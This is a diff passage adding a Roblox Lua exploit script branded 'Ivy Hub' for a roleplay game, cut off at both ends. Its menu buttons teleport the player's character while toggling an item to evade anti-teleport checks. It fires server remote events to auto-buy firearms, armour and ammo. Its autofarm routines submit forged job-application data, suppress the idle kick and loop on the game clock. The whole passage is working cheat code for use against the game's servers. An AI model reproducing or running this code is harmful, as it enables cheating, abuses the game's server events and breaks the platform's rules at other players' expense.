+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(463.78064, 4.0670104, 275.727936, -0.000924163149, -2.54360828e-07, -0.999999583, -8.14840584e-10, 1, -2.54360174e-07, 0.999999583, 5.79769954e-10, -0.000924163149)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "tped safetly", Icon = "rbxassetid://14445651728", Duration = 5,})
+end)
+--
+Section1:CreateButton("Pawnshop", function ()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-452.953613, 4.06701279, -24.2798595, 0.996192813, 1.70106222e-08, 0.0871769488, -4.81247753e-09, 1, -1.40134134e-07, -0.0871769488, 1.39181083e-07, 0.996192813)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-452.953613, 4.06701279, -24.2798595, 0.996192813, 1.70106222e-08, 0.0871769488, -4.81247753e-09, 1, -1.40134134e-07, -0.0871769488, 1.39181083e-07, 0.996192813)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.Fist)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-452.953613, 4.06701279, -24.2798595, 0.996192813, 1.70106222e-08, 0.0871769488, -4.81247753e-09, 1, -1.40134134e-07, -0.0871769488, 1.39181083e-07, 0.996192813)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-452.953613, 4.06701279, -24.2798595, 0.996192813, 1.70106222e-08, 0.0871769488, -4.81247753e-09, 1, -1.40134134e-07, -0.0871769488, 1.39181083e-07, 0.996192813)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-452.953613, 4.06701279, -24.2798595, 0.996192813, 1.70106222e-08, 0.0871769488, -4.81247753e-09, 1, -1.40134134e-07, -0.0871769488, 1.39181083e-07, 0.996192813)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "tped safetly", Icon = "rbxassetid://14445651728", Duration = 2,})
+end)
+
+--
+Section1:CreateButton("Barbershop", function ()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(54.5231895, 4.06701088, -132.951889, 0.998677671, -1.29629569e-07, 0.0514097288, 1.29867558e-07, 1, -1.28905508e-09, -0.0514097288, 7.9638065e-09, 0.998677671)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(54.5231895, 4.06701088, -132.951889, 0.998677671, -1.29629569e-07, 0.0514097288, 1.29867558e-07, 1, -1.28905508e-09, -0.0514097288, 7.9638065e-09, 0.998677671)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(54.5231895, 4.06701088, -132.951889, 0.998677671, -1.29629569e-07, 0.0514097288, 1.29867558e-07, 1, -1.28905508e-09, -0.0514097288, 7.9638065e-09, 0.998677671)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(54.5231895, 4.06701088, -132.951889, 0.998677671, -1.29629569e-07, 0.0514097288, 1.29867558e-07, 1, -1.28905508e-09, -0.0514097288, 7.9638065e-09, 0.998677671)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(54.5231895, 4.06701088, -132.951889, 0.998677671, -1.29629569e-07, 0.0514097288, 1.29867558e-07, 1, -1.28905508e-09, -0.0514097288, 7.9638065e-09, 0.998677671)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "tped safetly", Icon = "rbxassetid://14445651728", Duration = 2,})
+end)
+
+local Section2 = Page1:CreateSection("Normal Tps")
+
+Section2:CreateButton("Job Place", function ()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(261.755585, 4.36199427, 308.216278, 0.0341571495, 4.30581615e-08, 0.999416471, 3.64832822e-08, 1, -4.43301928e-08, -0.999416471, 3.79761893e-08, 0.0341571495)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(261.755585, 4.36199427, 308.216278, 0.0341571495, 4.30581615e-08, 0.999416471, 3.64832822e-08, 1, -4.43301928e-08, -0.999416471, 3.79761893e-08, 0.0341571495)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(261.755585, 4.36199427, 308.216278, 0.0341571495, 4.30581615e-08, 0.999416471, 3.64832822e-08, 1, -4.43301928e-08, -0.999416471, 3.79761893e-08, 0.0341571495)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(261.755585, 4.36199427, 308.216278, 0.0341571495, 4.30581615e-08, 0.999416471, 3.64832822e-08, 1, -4.43301928e-08, -0.999416471, 3.79761893e-08, 0.0341571495)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(261.755585, 4.36199427, 308.216278, 0.0341571495, 4.30581615e-08, 0.999416471, 3.64832822e-08, 1, -4.43301928e-08, -0.999416471, 3.79761893e-08, 0.0341571495)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "tped safetly", Icon = "rbxassetid://14445651728", Duration = 2,})
+end)
+--
+Section2:CreateButton("Gas Station", function ()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(261.755585, 4.36199427, 308.216278, 0.0341571495, 4.30581615e-08, 0.999416471, 3.64832822e-08, 1, -4.43301928e-08, -0.999416471, 3.79761893e-08, 0.0341571495)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(261.755585, 4.36199427, 308.216278, 0.0341571495, 4.30581615e-08, 0.999416471, 3.64832822e-08, 1, -4.43301928e-08, -0.999416471, 3.79761893e-08, 0.0341571495)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(261.755585, 4.36199427, 308.216278, 0.0341571495, 4.30581615e-08, 0.999416471, 3.64832822e-08, 1, -4.43301928e-08, -0.999416471, 3.79761893e-08, 0.0341571495)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(261.755585, 4.36199427, 308.216278, 0.0341571495, 4.30581615e-08, 0.999416471, 3.64832822e-08, 1, -4.43301928e-08, -0.999416471, 3.79761893e-08, 0.0341571495)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "tped safetly", Icon = "rbxassetid://14445651728", Duration = 2,})
+end)
+--
+Section2:CreateButton("Gun Store", function ()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-51.4995575, 4.06701088, 360.296021, -0.193530515, 4.21612256e-08, 0.981094241, 6.03379533e-08, 1, -3.10714192e-08, -0.981094241, 5.31839497e-08, -0.193530515)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-51.4995575, 4.06701088, 360.296021, -0.193530515, 4.21612256e-08, 0.981094241, 6.03379533e-08, 1, -3.10714192e-08, -0.981094241, 5.31839497e-08, -0.193530515)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-51.4995575, 4.06701088, 360.296021, -0.193530515, 4.21612256e-08, 0.981094241, 6.03379533e-08, 1, -3.10714192e-08, -0.981094241, 5.31839497e-08, -0.193530515)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-51.4995575, 4.06701088, 360.296021, -0.193530515, 4.21612256e-08, 0.981094241, 6.03379533e-08, 1, -3.10714192e-08, -0.981094241, 5.31839497e-08, -0.193530515)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-51.4995575, 4.06701088, 360.296021, -0.193530515, 4.21612256e-08, 0.981094241, 6.03379533e-08, 1, -3.10714192e-08, -0.981094241, 5.31839497e-08, -0.193530515)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "tped safetly", Icon = "rbxassetid://14445651728", Duration = 2,})
+end)
+--
+Section2:CreateButton("Ghomes", function ()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-198.457977, 4.06701088, 143.437912, 0.704148352, -3.87883183e-08, 0.710052907, 5.3359642e-08, 1, 1.71144221e-09, -0.710052907, 3.66830584e-08, 0.704148352)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-198.457977, 4.06701088, 143.437912, 0.704148352, -3.87883183e-08, 0.710052907, 5.3359642e-08, 1, 1.71144221e-09, -0.710052907, 3.66830584e-08, 0.704148352)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-198.457977, 4.06701088, 143.437912, 0.704148352, -3.87883183e-08, 0.710052907, 5.3359642e-08, 1, 1.71144221e-09, -0.710052907, 3.66830584e-08, 0.704148352)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-198.457977, 4.06701088, 143.437912, 0.704148352, -3.87883183e-08, 0.710052907, 5.3359642e-08, 1, 1.71144221e-09, -0.710052907, 3.66830584e-08, 0.704148352)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-198.457977, 4.06701088, 143.437912, 0.704148352, -3.87883183e-08, 0.710052907, 5.3359642e-08, 1, 1.71144221e-09, -0.710052907, 3.66830584e-08, 0.704148352)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "tped safetly", Icon = "rbxassetid://14445651728", Duration = 2,})
+end)
+--
+Section2:CreateButton("Mini 4", function ()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-604.255005, 4.19675684, 220.087372, 0.23435685, -2.13616183e-08, -0.972150624, 8.05396994e-08, 1, -2.55782218e-09, 0.972150624, -7.76972797e-08, 0.23435685)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-604.255005, 4.19675684, 220.087372, 0.23435685, -2.13616183e-08, -0.972150624, 8.05396994e-08, 1, -2.55782218e-09, 0.972150624, -7.76972797e-08, 0.23435685)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-604.255005, 4.19675684, 220.087372, 0.23435685, -2.13616183e-08, -0.972150624, 8.05396994e-08, 1, -2.55782218e-09, 0.972150624, -7.76972797e-08, 0.23435685)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-604.255005, 4.19675684, 220.087372, 0.23435685, -2.13616183e-08, -0.972150624, 8.05396994e-08, 1, -2.55782218e-09, 0.972150624, -7.76972797e-08, 0.23435685)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-604.255005, 4.19675684, 220.087372, 0.23435685, -2.13616183e-08, -0.972150624, 8.05396994e-08, 1, -2.55782218e-09, 0.972150624, -7.76972797e-08, 0.23435685)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "tped safetly", Icon = "rbxassetid://14445651728", Duration = 2,})
+end)
+
+local Page1 = windowz:CreatePage("AutoBuy")
+
+local Section1 = Page1:CreateSection("Weapons")
+
+Section1:CreateButton("Hi-Point", function ()
+    local args = {
+        [1] = "BuyFirearm",
+        [2] = "Hi-Point .380"
+    }
+    
+    game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("NPCService"):FireServer(unpack(args))
+end)
+
+Section1:CreateButton("Taurus", function ()
+    local args = {
+        [1] = "BuyFirearm",
+        [2] = "Taurus .380 Special"
+    }
+    
+    game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("NPCService"):FireServer(unpack(args))
+    
+end)
+
+
+Section1:CreateButton("Smith and wesson", function ()
+    local args = {
+        [1] = "BuyFirearm",
+        [2] = "Smith & Wesson 9mm"
+    }
+    
+    game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("NPCService"):FireServer(unpack(args))
+end)
+
+Section1:CreateButton("Ruger", function ()
+    local args = {
+        [1] = "BuyFirearm",
+        [2] = "Ruger 9mm"
+    }
+    
+    game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("NPCService"):FireServer(unpack(args))
+end)
+
+Section1:CreateButton("SpringField", function ()
+    local args = {
+        [1] = "BuyFirearm",
+        [2] = "Springfield XDS .45 ACP"
+    }
+    
+    game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("NPCService"):FireServer(unpack(args))
+end)
+
+
+Section1:CreateButton("Block-17", function ()
+    local args = {
+        [1] = "BuyFirearm",
+        [2] = "Block 17"
+    }
+    
+    game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("NPCService"):FireServer(unpack(args))
+end)
+
+Section1:CreateButton("Switch Blade", function ()
+    function getNil(name,class) for _,v in next, getnilinstances() do if v.ClassName==class and v.Name==name then return v;end end end
+
+local args = {
+    [1] = "PurchaseBlade",
+    [2] = getNil("PlayerShopHud", "ScreenGui")
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("ShopService"):FireServer(unpack(args))
+ end)
+
+ local Section2 = Page1:CreateSection("Items")
+
+ Section2:CreateButton("Buy Kevlar BP Vest", function ()
+    local args = {
+        [1] = "BuyKevlarBPVest"
+    }
+    
+    game:GetService("ReplicatedStorage").Events.ClientService:FireServer(unpack(args))
+end)
+
+
+
+Section2:CreateButton("Buy Regular BP vest", function ()
+    local args = {
+        [1] = "BuyRegularBPVest"
+    }
+    
+    game:GetService("ReplicatedStorage").Events.ClientService:FireServer(unpack(args))
+end)
+
+
+Section2:CreateButton("Buy .45ACP", function ()
+    local args = {
+		[1] = "BuyAmmo_45"
+	
+	}
+	
+	game:GetService("ReplicatedStorage").Events.ClientService:FireServer(unpack(args))
+end)
+
+
+
+Section2:CreateButton("Buy 9mm", function ()
+    local args = {
+		[1] = "BuyAmmo_9"
+	
+	}
+	
+	game:GetService("ReplicatedStorage").Events.ClientService:FireServer(unpack(args))
+end)
+
+
+
+Section2:CreateButton("Buy .380", function ()
+    local args = {
+		[1] = "BuyAmmo_380"
+	
+	}
+	
+	game:GetService("ReplicatedStorage").Events.ClientService:FireServer(unpack(args))
+end)
+
+
+Section2:CreateButton("Cherry Spice Delux", function ()
+    local args = {
+        [1] = "Cherry Spice Delux"
+    }
+    
+    game:GetService("ReplicatedStorage").Events.ShopService:FireServer(unpack(args))
+end)
+
+local Page1 = windowz:CreatePage("Autofarms")
+
+
+local Section1 = Page1:CreateSection("Basic")
+
+Section1:CreateButton("Actor", function ()
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "starting autofarm...", Icon = "rbxassetid://14445651728", Duration = 3,})
+    wait(1)
+    local vu = game:GetService("VirtualUser")
+game:GetService("Players").LocalPlayer.Idled:connect(function()
+   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+   wait(1)
+   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+end)
+ 
+print("Loading #1")
+ 
+local function Start()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    
+ 
+    wait(.1)
+ 
+    local A_1 = "GiveGui"
+    local Event = game:GetService("ReplicatedStorage").Events.JobService
+    Event:FireServer(A_1)
+ 
+    wait(.1)
+ 
+    local A_1 = "Apply"
+    local A_2 = 
+    {
+        ["job_radius"] = 20000, 
+        ["CanWork"] = true, 
+        ["indoor_job_point"] = game:GetService("Workspace").JobPoints.TheaterInterior, 
+        ["Workers"] = 
+    {
+    }, 
+        ["ID"] = "MovieActor", 
+        ["job_point"] = game:GetService("Workspace").JobPoints.Theater, 
+        ["MaxPositions"] = 4, 
+        ["Data"] = 
+    {
+        ["HourReqirement"] = 2, 
+        ["EndTime"] = "23:00:00", 
+        ["Shiftless"] = false, 
+        ["JobDesc"] = "Roleplay improv scenarios to give a show to the audience. Dress in costumes and use props to convey a playscript with a unique twist of your own flavor!", 
+        ["JobTitle"] = "Actor", 
+        ["RequiredConstantWork"] = false, 
+        ["UniformShirt"] = 6401487262, 
+        ["UniformPants"] = 7442991927, 
+        ["Commission"] = 0, 
+        ["StartTime"] = "17:00:00", 
+        ["BasePay"] = 450, 
+        ["JobRules"] = "Use the door in the theater room to enter the backstage, from there follow the prompts and pick your costume, and make sure your team roleplays according to the script. Use /me to roleplay actions (ex: /me picks up the rock.)"
+    }
+    }
+    local Event = game:GetService("ReplicatedStorage").Events.JobService
+    Event:FireServer(A_1, A_2)
+wait(.1)
+ 
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+
+end
+ 
+Start()
+ 
+local function Check()
+    if game:GetService("Lighting").ClockTime == 23 then
+        print("Restarting")
+        Start()
+    end
+end
+ 
+game:GetService("Lighting"):GetPropertyChangedSignal("ClockTime"):Connect(Check)
+ 
+print("Nvy w autofarm")
+end)
+---
+Section1:CreateButton("LitFits", function ()
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "starting autofarm...", Icon = "rbxassetid://14445651728", Duration = 3,})
+    wait(1)
+    local Player = game.Players.LocalPlayer
+local Character = Player.Character
+local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+
+local function SendMessage(message)
+    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+    local ChatModule = require(game.Players.LocalPlayer.PlayerScripts.ChatScript.ChatMain)
+    ChatModule.MessagePosted:fire(message);
+end
+
+local function Start()
+   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
